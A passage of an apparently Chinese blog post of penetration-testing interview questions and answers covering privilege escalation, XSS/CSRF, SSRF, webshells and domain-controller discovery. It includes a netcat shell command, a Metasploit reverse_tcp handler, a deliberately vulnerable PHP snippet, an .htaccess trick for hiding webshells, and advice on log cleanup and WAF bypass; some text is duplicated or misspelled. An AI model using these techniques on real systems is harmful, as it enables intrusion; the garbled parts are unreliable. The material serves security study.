href="#22、如果给你⼀个⽹站-你的渗透测试思路是什么-在获取书⾯授权的前提下。" class="headerlink" title="22、如果给你⼀个⽹站, 你的渗透测试思路是什么? 在获取书⾯授权的前提下。"></a>22、如果给你⼀个⽹站, 你的渗透测试思路是什么? 在获取书⾯授权的前提下。</h4><p>其实这是⼀个⾮常⼤的话题，渗透⼤部分思路都是如此，⽽⾯试官是想听到你回答不⼀样的答案让⼈眼前⼀亮 如何才做 </p><p>到让⼈眼前⼀亮都需要看你的经验，把你实践的过程拿出来说，以及遇到什么问题如何解决，最终取得成果 渗透其它⼤ </p><p>同⼩异, ⽽做为渗透者知识的储备、基础扎实、耐⼼、细⼼都是必不可少。 </p><h4 id="23、谈⼀谈-Windows-系统与-Linux-系统提权的思路？"><a href="#23、谈⼀谈-Windows-系统与-Linux-系统提权的思路？" class="headerlink" title="23、谈⼀谈 Windows 系统与 Linux 系统提权的思路？"></a>23、谈⼀谈 Windows 系统与 Linux 系统提权的思路？</h4><p>Windows </p><p>Windows 服务⽐较多所以⽅法也如此，最基本的就是 Exp 提权，数据库 SQLServer、MYSQL UDF 等、第三⽅软件提 </p><p>权。</p><p>除此之外提权的成功与否和在于信息收集也⾮常重要，你对这台服务器和管理员了解多少。 </p><p>windows 权限提升 (⼆) </p><p>Linux </p><p>Linux 也是类似，除了 EXP 或者⾼版本的内核⽆法提权之外，通过第三⽅软件和服务，除了提权也可以考虑把这台机器 </p><p>当跳版, </p><p>达到先进⼊内⽹安全防线最弱的地⽅寻找有⽤的信息，再迂回战术。 </p><p>linux 权限提升 </p><p>Brief </p><p>枚举脚本以 root 权限运⾏的程序 </p><p>⽤户安装的软件 </p><p>弱⼝令或者明⽂密码 </p><p>只能内部访问的服务 </p><p>suid 和 guid 错误配置 </p><p>滥⽤ sudo 权限 </p><p>以 root 权限运⾏的脚本⽂件 </p><p>错误的路径配置 </p><p>计划任务 </p><p>未挂载的⽂件系统</p><p>NFS 共享</p><p>通过键盘记录仪窃取密码 </p><p>其它有⽤的和提权相关的东⻄ </p><p>内核提权 </p><h4 id="24、列举出您所知道的所有开源组件⾼危漏洞-⼗个以上"><a href="#24、列举出您所知道的所有开源组件⾼危漏洞-⼗个以上" class="headerlink" title="24、列举出您所知道的所有开源组件⾼危漏洞 (⼗个以上)"></a>24、列举出您所知道的所有开源组件⾼危漏洞 (⼗个以上)</h4><p>Tomcat </p><p>NginxApache </p><p>Hadhoop </p><p>Docker </p><p>Jenkins </p><p>Zenoss </p><p>Jboss </p><p>MongoDB </p><p>Redis </p><p>GlassFish </p><h4 id="25、反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？"><a href="#25、反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？" class="headerlink" title="25、反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？"></a>25、反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？</h4><p>nc -lvvp 7777 -e /bin/bash </p><p>bash 是交互式, 否则像 useradd ⽆法执⾏交互</p><h4 id="26、CMD-命令⾏如何查询远程终端开放端⼝"><a href="#26、CMD-命令⾏如何查询远程终端开放端⼝" class="headerlink" title="26、CMD 命令⾏如何查询远程终端开放端⼝"></a>26、CMD 命令⾏如何查询远程终端开放端⼝</h4><p>tasklist /svc </p><p>netstat -ano </p><h4 id="27、服务器为-IIS-PHP-MySQL，发现-root-权限注⼊漏洞，讲讲你的渗透思路"><a href="#27、服务器为-IIS-PHP-MySQL，发现-root-权限注⼊漏洞，讲讲你的渗透思路" class="headerlink" title="27、服务器为 IIS+PHP+MySQL，发现 root 权限注⼊漏洞，讲讲你的渗透思路"></a>27、服务器为 IIS+PHP+MySQL，发现 root 权限注⼊漏洞，讲讲你的渗透思路</h4><p>可以读取 IIS 信息，知道路径, 如果像 WAMMP 类似构建，通过 @@datadir 知道数据库路径也可以猜测⽹站路径。或者直接写 Shell </p><h4 id="28、请写出-Mysql5-数据库中查询库表所有列名的语句"><a href="#28、请写出-Mysql5-数据库中查询库表所有列名的语句" class="headerlink" title="28、请写出 Mysql5 数据库中查询库表所有列名的语句"></a>28、请写出 Mysql5 数据库中查询库表所有列名的语句</h4><p>select COLUMN_NAME from information_schema.COLUMNS where table_name = ‘your_table_name’ and </p><p>table_schema = ‘your_db_name’; </p><h4 id="29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤"><a href="#29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤" class="headerlink" title="29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤"></a>29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤</h4><p><a href="http://www.exp.com/1.php">http://www.exp.com/1.php</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$s_func &#x3D; $_GET[&#39;s_func&#39;]; </span><br><span class="line"></span><br><span class="line">$info &#x3D; $_GET[&#39;info&#39;]; </span><br><span class="line"></span><br><span class="line">$s_func($info); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码执⾏, 通过 assert 调⽤ </p><h4 id="30、udf-提权"><a href="#30、udf-提权" class="headerlink" title="30、udf 提权"></a>30、udf 提权</h4><p>MySQL 可以⾃定义函数, 通过⾃定义函数做到类似 xp_cmdshell 效果 </p><h4 id="31、SQL-头注⼊点"><a href="#31、SQL-头注⼊点" class="headerlink" title="31、SQL 头注⼊点"></a>31、SQL 头注⼊点</h4><p>UserAgent </p><p>Referer </p><p>CookieCookie </p><p>X-FOR-I </p><h4 id="32、php-中命令执⾏涉及到的函数"><a href="#32、php-中命令执⾏涉及到的函数" class="headerlink" title="32、php 中命令执⾏涉及到的函数"></a>32、php 中命令执⾏涉及到的函数</h4><p>eval() </p><p>assert() </p><p>system() </p><p>exec() </p><p>shell_exec() </p><h4 id="33、SSRF-漏洞的成因-防御-绕过"><a href="#33、SSRF-漏洞的成因-防御-绕过" class="headerlink" title="33、SSRF 漏洞的成因 防御 绕过"></a>33、SSRF 漏洞的成因 防御 绕过</h4><p>模拟服务器对其它资源进⾏请求 IP 探测，如果想漏洞利⽤必需要构造好 Payload 禁⽌跳转，限制协议，内外⽹限制， </p><p>URL 限制 针对 IP 格式 </p><h4 id="34、mysql-写-shell-有⼏种⽅法"><a href="#34、mysql-写-shell-有⼏种⽅法" class="headerlink" title="34、mysql 写 shell 有⼏种⽅法"></a>34、mysql 写 shell 有⼏种⽅法</h4><p>outfifile、dumpfifile、开启 log 写 webshell </p><h4 id="35、Metasploit-打开反向监听的命令"><a href="#35、Metasploit-打开反向监听的命令" class="headerlink" title="35、Metasploit 打开反向监听的命令"></a>35、Metasploit 打开反向监听的命令</h4><p>use exploit/multi/handler </p><p>set payload windows/meterpreter/reverse_tcp </p><h4 id="36、应急响应的步骤"><a href="#36、应急响应的步骤" class="headerlink" title="36、应急响应的步骤"></a>36、应急响应的步骤</h4><ol><li><p>准备已经编译好的⼯具以及取证分析等⼯具⼲净可靠放 U 盘 </p></li><li><p>初步判断事件的类型 是被⼊侵 ddos 还是其它的原因2. 初步判断事件的类型，是被⼊侵、ddos 还是其它的原因  </p></li><li><p>⾸先抑制范围、影响范围，隔离使受害⾯不继续扩⼤。 </p></li><li><p>寻找原因，封堵攻击源。 </p></li><li><p>把业务恢复⾄正常⽔平 </p></li><li><p>监控有⽆异常，报告、管理环节的⾃省和改进措施。 </p></li></ol><h4 id="37、有哪些反向代理的⼯具"><a href="#37、有哪些反向代理的⼯具" class="headerlink" title="37、有哪些反向代理的⼯具?"></a>37、有哪些反向代理的⼯具?</h4><p>reGeirg、EW、lcx、Ngrok、frp </p><h4 id="38、有什么⽐较曲折的渗透经历"><a href="#38、有什么⽐较曲折的渗透经历" class="headerlink" title="38、有什么⽐较曲折的渗透经历"></a>38、有什么⽐较曲折的渗透经历</h4><p>这个问题想知道你⼯作渗透到什么样的程度，只是简单的漏扫搬砖，还是有毅⼒坚持完成整个渗透，如：对⽬标不放 </p><p>弃，坚持⼀个⽉最终通过各种⼿段，曲折的过程拿下⽬标。 </p><h4 id="39、怎么查找域控"><a href="#39、怎么查找域控" class="headerlink" title="39、怎么查找域控"></a>39、怎么查找域控</h4><p>⽅法有很多 </p><p>1.通过 DNS 查询 </p><p>dig -t SRV _gc._tcp.lab.ropnop.com </p><p>dig -t SRV _ldap._tcp.lab.ropnop.com </p><p>dig -t SRV _kerberos._tcp.lab.ropnop.com </p><p>dig -t SRV _kpasswd._tcp.lab.ropnop.com </p><p>2.端⼝扫描 </p><p>域服务器都会开启 389 端⼝，所以可以通过扫描端⼝进⾏识别。 </p><p>3.其实很多域环境⾥，DNS 服务器就是域控制根本不需要怎么找。 </p><p>4.各种命令 </p><p>dsquery </p><p>net group “Domain controllers” </p><p>nltest /DCLIST:pentest.com </p><p>…… </p><h2 id="前端篇"><a href="#前端篇" class="headerlink" title="前端篇"></a>前端篇</h2><h4 id="1、什么是同源策略"><a href="#1、什么是同源策略" class="headerlink" title="1、什么是同源策略?"></a>1、什么是同源策略?</h4><p>源就是主机、协议、端⼝名的⼀个三元组 同源策略 (Same Origin Policy, SOP) 是 Web 应⽤程序的⼀种安全模型，被⼴ </p><p>泛地应⽤在处理 WEB 内容的各种客户端上，⽐如各⼤浏览器，微软的 Silverlight，Adobe 的 Flash/Acrobat 等等。 </p><h4 id="2、XSS-能⽤来做什么？"><a href="#2、XSS-能⽤来做什么？" class="headerlink" title="2、XSS 能⽤来做什么？"></a>2、XSS 能⽤来做什么？</h4><p>⽹络钓⻥、窃取⽤户 Cookies、弹⼴告刷流量、具备改⻚⾯信息、删除⽂章、获取客户端信息、传播蠕⾍ </p><h4 id="3、XSS-的三种类型，防御⽅法"><a href="#3、XSS-的三种类型，防御⽅法" class="headerlink" title="3、XSS 的三种类型，防御⽅法"></a>3、XSS 的三种类型，防御⽅法</h4><p>反射型、Dom Base XSS、存储型 防御⽅法这个只能说个⼤概，毕竟这是⼀个⽐较⼤的话题，⽽且防御的⽅法还得看所 </p><p>在的业务等。从⽹络层、主机层、Web 层、数据库，通过 CDN 都有过滤常⻅⼀些攻击⼿法，但不能有 CDN 就以为可</p><p>以了，添加 CDN 只是让攻击成本增⾼，开启 HttpOnly，以防确实存在避免 cookies 被获取，CSP 策略、再就是语⾔中 </p><p>提供的函数对输⼊过滤，以及输出编码以及 ModSecurity 类的防⽕墙。 </p><h4 id="4、存储型-xss-原理"><a href="#4、存储型-xss-原理" class="headerlink" title="4、存储型 xss 原理?"></a>4、存储型 xss 原理?</h4><p>如⽹站留⾔版，把插⼊的记录存储在数据库中，插⼊的代码会⼀直留在⻚⾯上，当其它⽤户访问会从数据库中读取并触 </p><p>发漏洞。 </p><h4 id="5、你怎么理解-xss-攻击？"><a href="#5、你怎么理解-xss-攻击？" class="headerlink" title="5、你怎么理解 xss 攻击？"></a>5、你怎么理解 xss 攻击？</h4><p>是⼀种被动型，在不知道的情况下触发类似⽆感型，在渗透很多情况下平常的渗透⼿段以及取得⽬标的信息，⽽ XSS 就 </p><p>能轻松获取，类似 QQ 邮箱你不可能渗透这么⼤的互联⽹就算可以时间成本都⾮常的⾼，XSS ⽐较有针对性。 </p><h4 id="6、如何快速发现-xss-位置？"><a href="#6、如何快速发现-xss-位置？" class="headerlink" title="6、如何快速发现 xss 位置？"></a>6、如何快速发现 xss 位置？</h4><p>各种输⼊的点，名称、上传、留⾔、可交互的地⽅，⼀切输⼊都是在害原则。 </p><h4 id="7、Dom-xss-原理-防范"><a href="#7、Dom-xss-原理-防范" class="headerlink" title="7、Dom xss 原理 / 防范"></a>7、Dom xss 原理 / 防范</h4><p>DOM 型 XSS 并不需要服务器解析响应的直接参与触发 XSS 靠的是浏览器 DOM 解析 DOM—based XSS 漏洞是基于⽂ </p><p>档对象模型 Document Objeet Model,DOM) 的⼀种漏洞。 </p><p>cument.getElementById(“a”).innerHTML=”yyyyyy”; </p><p>在输⼊点过滤敏感关键字 </p><h4 id="8、DOM-型-XSS-与反射型-XSS-区别？"><a href="#8、DOM-型-XSS-与反射型-XSS-区别？" class="headerlink" title="8、DOM 型 XSS 与反射型 XSS 区别？"></a>8、DOM 型 XSS 与反射型 XSS 区别？</h4><p>DOM 型就是 JavaScript 中的 Document 对象 HTML 注⼊，直接浏览器处理。 </p><h4 id="9、如何使得前端-referer-为空"><a href="#9、如何使得前端-referer-为空" class="headerlink" title="9、如何使得前端 referer 为空"></a>9、如何使得前端 referer 为空</h4><p>通过地址栏输⼊、从书签⾥⾯选择或者浏览器的插件 BurpSuite 修改。 </p><h4 id="10、cookie-参数，security-⼲什么的"><a href="#10、cookie-参数，security-⼲什么的" class="headerlink" title="10、cookie 参数，security ⼲什么的"></a>10、cookie 参数，security ⼲什么的</h4><p>Httponly：防⽌ cookie 被 xss 偷https：防⽌ cookie 在⽹络中被偷 </p><p>Secure：阻⽌ cookie 在⾮ https 下传输，很多全站 https 时会漏掉 </p><p>Path : 区分 cookie 的标识，安全上作⽤不⼤，和浏览器同源冲突 </p><h4 id="11、如果-SRC-上报了⼀个-XSS-漏洞，payload-已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？"><a href="#11、如果-SRC-上报了⼀个-XSS-漏洞，payload-已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？" class="headerlink" title="11、如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？"></a>11、如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？</h4><p>看是否什么类型的 XSS，XSS 反射型看提交的地址，指的参数是哪个位置，通过这个⻚⾯进⾏ fuzzing 测试。如果是存 </p><p>储型⻚⾯查找关键字。 </p><h4 id="12、XSS，-CSRF，-CRLF-⽐较容易弄混，说说三者的原理，防御⽅法"><a href="#12、XSS，-CSRF，-CRLF-⽐较容易弄混，说说三者的原理，防御⽅法" class="headerlink" title="12、XSS， CSRF， CRLF ⽐较容易弄混，说说三者的原理，防御⽅法"></a>12、XSS， CSRF， CRLF ⽐较容易弄混，说说三者的原理，防御⽅法</h4><p>CSRF 跨站请求伪造，构造已知的所有参数让对⽅访问, </p><p>防护 CSRF: 防御原理：不让你那么容易伪造请求 (cookie 中加⼊随机数，要求请求中带上，⽽攻击者获取不到 cookie </p><p>中的随机数, 验证 HTTP Referer 字段, 在请求地址中添加 takon 验证 </p><p>CRLF 原理: </p><p>HTTP 拆分攻击（HTTP Splitting），CRLF 是” 回⻋ + 换⾏”（\r\n）的简称。 </p><p>在 HTTP 协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP </p><p>内容并显示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏，这样我们就能注⼊⼀些会话 </p><p>Cookie 或者 HTML 代码，所以 CRLF Injection ⼜叫 HTTP Response Splitting，简称 HRS。 </p><h4 id="13、csrf-如何不带-referer-访问"><a href="#13、csrf-如何不带-referer-访问" class="headerlink" title="13、csrf 如何不带 referer 访问"></a>13、csrf 如何不带 referer 访问</h4><p>通过地址栏，⼿动输⼊；从书签⾥⾯选择；通过实现设定好的⼿势。上⾯说的这三种都是⽤户⾃⼰去操作，因此不算 </p><p>CSRF。 </p><p>跨协议间提交请求。常⻅的协议：ftp://,http://,https://,fifile://,javascript:,data:. 最简单的情况就是我们在本地打开⼀个</p><p>HTML ⻚⾯ 这个时候浏览器地址栏是 fifile:// 开头的 如果这个 HTML ⻚⾯向任何 http 站点提交请求的话 这些请求HTML ⻚⾯，这个时候浏览器地址栏是 fifile:// 开头的，如果这个 HTML ⻚⾯向任何 http 站点提交请求的话，这些请求 </p><p>的 Referer 都是空的。那么我们接下来可以利⽤ data: 协议来构造⼀个⾃动提交的 CSRF 攻击。当然这个协议是 IE 不⽀ </p><p>持的，我们可以换⽤ javascript: </p><h4 id="14、CSRF-成因及防御措施；如果不⽤-token-如何做防御？"><a href="#14、CSRF-成因及防御措施；如果不⽤-token-如何做防御？" class="headerlink" title="14、CSRF 成因及防御措施；如果不⽤ token 如何做防御？"></a>14、CSRF 成因及防御措施；如果不⽤ token 如何做防御？</h4><p>X-Frame-Options </p><p>DENY(禁⽌被 加载进任何 frame) </p><p>SAMEORIGIN(仅允许被加载进同域内的 frame) </p><p>X-XSS-Protection </p><p>0（表示禁⽌⽤这个策略） </p><p>1（默认，对危险脚本做⼀些标志或修改，以阻⽌在浏览器上熏染执⾏。） </p><p>1;mode=block（强制不熏染，在 Chrome 下直接跳转到空⽩⻚，在 IE 下返回⼀个 #符号） </p><p>这个策略仅针对反射型，对付不了存储型 XSS，能识别出反射型是因为提交请求的 URL 中带有可疑的 XSS 代码⽚段。 </p><p>X-Content-Security-Policy </p><h4 id="15、Xss-worm-原理"><a href="#15、Xss-worm-原理" class="headerlink" title="15、Xss worm 原理"></a>15、Xss worm 原理</h4><p>攻击者发现⽬标⽹站存在 XSS 漏洞，并且可以编写 XSS 蠕⾍。利⽤⼀个宿主（如博客空间）作为传播源头进⾏ XSS 攻 </p><p>击。</p><h4 id="16、Cookie-的-P3P-性质"><a href="#16、Cookie-的-P3P-性质" class="headerlink" title="16、Cookie 的 P3P 性质"></a>16、Cookie 的 P3P 性质</h4><p>HTTP 响应头的 p3 字段是 W3C 公布的⼀项隐私保护推荐标准，该字段⽤于标识是否允许⽬标⽹站的 cookie 被另⼀个</p><p>域通过加载⽬标⽹站⽽设置或发送，仅 IE 执⾏了该策略。17、CSRF 有何危害？ </p><p>篡改⽬标⽹站上的⽤户数据 盗取⽤户隐私数据 传播 CSRF 蠕 </p><h3 id="⼀、思路流程"><a href="#⼀、思路流程" class="headerlink" title="⼀、思路流程"></a>⼀、思路流程</h3><h4 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h4><p>a、服务器的相关信息（真实 ip，系统类型，版本，开放端⼝，WAF 等） </p><p>b、⽹站指纹识别（包括，cms，cdn，证书等），dns 记录 </p><p>c、whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社⼯库，社⼯准备等） </p><p>e、⼦域名收集，旁站，C 段等 </p><p>f、google hacking 针对化搜索，pdf ⽂件，中间件版本，弱⼝令扫描等 </p><p>g、扫描⽹站⽬录结构，爆后台，⽹站 banner，测试⽂件，备份等敏感⽂件泄漏等 </p><p>h、传输协议，通⽤漏洞，exp，github 源码等 </p><h4 id="2、漏洞挖掘"><a href="#2、漏洞挖掘" class="headerlink" title="2、漏洞挖掘"></a>2、漏洞挖掘</h4><p>a、浏览⽹站，看看⽹站规模，功能，特点等 </p><p>b、端⼝，弱⼝令，⽬录等扫描, 对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 </p><p>c、XSS，SQL 注⼊，上传，命令注⼊，CSRF，cookie 安全检测，敏感信息，通信数据传输，暴⼒破解，任意⽂件上 </p><p>传，越权访问，未授权访问，⽬录遍历，⽂件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使⽤漏扫⼯具等 </p><h4 id="3、漏洞利⽤-amp-权限提升"><a href="#3、漏洞利⽤-amp-权限提升" class="headerlink" title="3、漏洞利⽤ &amp; 权限提升"></a>3、漏洞利⽤ &amp; 权限提升</h4><p>a mysql 提权 serv u 提权 oracle 提权a、mysql 提权，serv-u 提权，oracle 提权 </p><p>b、windows 溢出提权 </p><p>c、linux 脏⽜, 内核漏洞提权 e </p><h4 id="4、清除测试数据-amp-输出报告"><a href="#4、清除测试数据-amp-输出报告" class="headerlink" title="4、清除测试数据 &amp; 输出报告"></a>4、清除测试数据 &amp; 输出报告</h4><p>⽇志、测试数据的清理 </p><p>总结，输出渗透测试报告，附修复⽅案 </p><h4 id="5、复测"><a href="#5、复测" class="headerlink" title="5、复测"></a>5、复测</h4><p>验证并发现是否有新漏洞，输出报告，归档 </p><h3 id="⼆、问题"><a href="#⼆、问题" class="headerlink" title="⼆、问题"></a>⼆、问题</h3><h4 id="1、拿到⼀个待检测的站，你觉得应该先做什么？"><a href="#1、拿到⼀个待检测的站，你觉得应该先做什么？" class="headerlink" title="1、拿到⼀个待检测的站，你觉得应该先做什么？"></a>1、拿到⼀个待检测的站，你觉得应该先做什么？</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>a、获取域名的 whois 信息, 获取注册者邮箱姓名电话等，丢社⼯库⾥看看有没有泄露密码，然后尝试⽤泄露的密码进⾏ </p><p>登录后台。⽤邮箱做关键词进⾏丢进搜索引擎。利⽤搜索到的关联信息找出其他邮箱进⽽得到常⽤社交账号。社⼯找出 </p><p>社交账号，⾥⾯或许会找出管理员设置密码的习惯 。利⽤已有信息⽣成专⽤字典。 </p><p>b、查询服务器旁站以及⼦域名站点，因为主站⼀般⽐较难，所以先看看旁站有没有通⽤性的 cms 或者其他漏洞。 </p><p>c、查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，⽐如 IIS，APACHE,NGINX 的解析漏洞 </p><p>d、查看 IP，进⾏ IP 地址端⼝扫描，对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 </p><p>e、扫描⽹站⽬录结构，看看是否可以遍历⽬录，或者敏感⽂件泄漏，⽐如 php 探针 </p><p>f、google hack 进⼀步探测⽹站的信息，后台，敏感⽂件 </p><h5 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h5><p>开始检测漏洞 如 XSS XSRF sql 注⼊ 代码执⾏ 命令执⾏ 越权访问 ⽬录读取 任意⽂件读取 下载 ⽂件包含开始检测漏洞，如 XSS,XSRF,sql 注⼊，代码执⾏，命令执⾏，越权访问，⽬录读取，任意⽂件读取，下载，⽂件包含， </p><p>远程命令执⾏，弱⼝令，上传，编辑器漏洞，暴⼒破解等 </p><h5 id="漏洞利⽤"><a href="#漏洞利⽤" class="headerlink" title="漏洞利⽤"></a>漏洞利⽤</h5><p>利⽤以上的⽅式拿到 webshell，或者其他权限 </p><h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>提权服务器，⽐如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，如 iis6,pr, 巴⻄烤⾁，linux </p><p>脏⽜漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权 </p><h5 id="⽇志清理"><a href="#⽇志清理" class="headerlink" title="⽇志清理"></a>⽇志清理</h5><h5 id="总结报告及修复⽅案"><a href="#总结报告及修复⽅案" class="headerlink" title="总结报告及修复⽅案"></a>总结报告及修复⽅案</h5><h4 id="2、判断出⽹站的-CMS-对渗透有什么意义？"><a href="#2、判断出⽹站的-CMS-对渗透有什么意义？" class="headerlink" title="2、判断出⽹站的 CMS 对渗透有什么意义？"></a>2、判断出⽹站的 CMS 对渗透有什么意义？</h4><p>查找⽹上已曝光的程序漏洞。 </p><p>如果开源，还能下载相对应的源码进⾏代码审计。 </p><h4 id="3-⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？"><a href="#3-⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？" class="headerlink" title="3. ⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？"></a>3. ⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？</h4><p>敏感⽂件、⼆级⽬录扫描 </p><p>站⻓的误操作⽐如：⽹站备份的压缩⽂件、说明. txt、⼆级⽬录可能存放着其他站点 </p><h4 id="4-常⻅的⽹站服务器容器。"><a href="#4-常⻅的⽹站服务器容器。" class="headerlink" title="4.常⻅的⽹站服务器容器。"></a>4.常⻅的⽹站服务器容器。</h4><p>IIS、Apache、nginx、Lighttpd、Tomcat </p><h4 id="5-mysql-注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？"><a href="#5-mysql-注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？" class="headerlink" title="5.mysql 注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？"></a>5.mysql 注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？</h4><p>以 站的绝对路root 权限以及⽹站的绝对路径。 </p><h4 id="6-⽬前已知哪些版本的容器有解析漏洞，具体举例。"><a href="#6-⽬前已知哪些版本的容器有解析漏洞，具体举例。" class="headerlink" title="6.⽬前已知哪些版本的容器有解析漏洞，具体举例。"></a>6.⽬前已知哪些版本的容器有解析漏洞，具体举例。</h4><p>a、IIS 6.0</p><p>/xx.asp/xx.jpg “xx.asp” 是⽂件夹名 </p><p>b、IIS 7.0/7.5 </p><p>默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 </p><p>c、Nginx </p><p>版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。空字节代码 xxx.jpg.php </p><p>d、Apache 上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 </p><p>e、lighttpd xx.jpg/xx.php，不全, 请⼩伙伴们在评论处不吝补充，谢谢！ </p><ol start="7"><li><h4 id="如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？"><a href="#如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？" class="headerlink" title="如何⼿⼯快速判断⽬标站是 windows 还是 linux 服务器？"></a>如何⼿⼯快速判断⽬标站是 windows 还是 linux 服务器？</h4></li></ol><p>linux ⼤⼩写敏感, windows ⼤⼩写不敏感。 </p><h4 id="8-为何⼀个-mysql-数据库的站，只有⼀个-80-端⼝开放？"><a href="#8-为何⼀个-mysql-数据库的站，只有⼀个-80-端⼝开放？" class="headerlink" title="8. 为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？"></a>8. 为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？</h4><p>更改了端⼝，没有扫描出来。 </p><p>站库分离。 </p><p>3306 端⼝不对外开放 </p><h4 id="9、3389-⽆法连接的⼏种情况"><a href="#9、3389-⽆法连接的⼏种情况" class="headerlink" title="9、3389 ⽆法连接的⼏种情况"></a>9、3389 ⽆法连接的⼏种情况</h4><p>没开放 3389 端⼝ </p><p>端⼝被修改防护拦截</p><p>处于内⽹ (需进⾏端⼝转发) </p><h4 id="10-如何突破注⼊时字符被转义？"><a href="#10-如何突破注⼊时字符被转义？" class="headerlink" title="10. 如何突破注⼊时字符被转义？"></a>10. 如何突破注⼊时字符被转义？</h4><p>宽字符注⼊ </p><p>hex 编码绕过 </p><h4 id="11-在某后台新闻编辑界⾯看到编辑器，应该先做什么？"><a href="#11-在某后台新闻编辑界⾯看到编辑器，应该先做什么？" class="headerlink" title="11. 在某后台新闻编辑界⾯看到编辑器，应该先做什么？"></a>11. 在某后台新闻编辑界⾯看到编辑器，应该先做什么？</h4><p>查看编辑器的名称版本, 然后搜索公开的漏洞。 </p><h4 id="12-拿到⼀个-webshell-发现⽹站根⽬录下有-htaccess-⽂件，我们能做什么？"><a href="#12-拿到⼀个-webshell-发现⽹站根⽬录下有-htaccess-⽂件，我们能做什么？" class="headerlink" title="12. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？"></a>12. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？</h4><p>能做的事情很多，⽤隐藏⽹⻢来举例⼦： </p><p>插⼊</p><p>&lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </p><p>.jpg ⽂件会被解析成. php ⽂件。 </p><p>具体其他的事情，不好详说，建议⼤家⾃⼰去搜索语句来玩玩。 </p><h4 id="13-注⼊漏洞只能查账号密码？"><a href="#13-注⼊漏洞只能查账号密码？" class="headerlink" title="13. 注⼊漏洞只能查账号密码？"></a>13. 注⼊漏洞只能查账号密码？</h4><p>只要权限⼴，拖库脱到⽼。 </p><h4 id="14-安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？"><a href="#14-安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？" class="headerlink" title="14. 安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？"></a>14. 安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？</h4><p>是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是⼀成不变的。 </p><h4 id="15-access-扫出后缀为-asp-的数据库⽂件，访问乱码，-如何实现到本地利⽤？"><a href="#15-access-扫出后缀为-asp-的数据库⽂件，访问乱码，-如何实现到本地利⽤？" class="headerlink" title="15.access 扫出后缀为 asp 的数据库⽂件，访问乱码， 如何实现到本地利⽤？"></a><strong>15.access 扫出后缀为 asp 的数据库⽂件，访问乱码，</strong> 如何实现到本地利⽤？</h4><p>迅雷下载，直接改后缀为. mdb。 </p><h4 id="16-提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为-exp-执⾏多半需要空格界定参数"><a href="#16-提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为-exp-执⾏多半需要空格界定参数" class="headerlink" title="16. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为 exp 执⾏多半需要空格界定参数"></a>16. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为 exp 执⾏多半需要空格界定参数</h4><h4 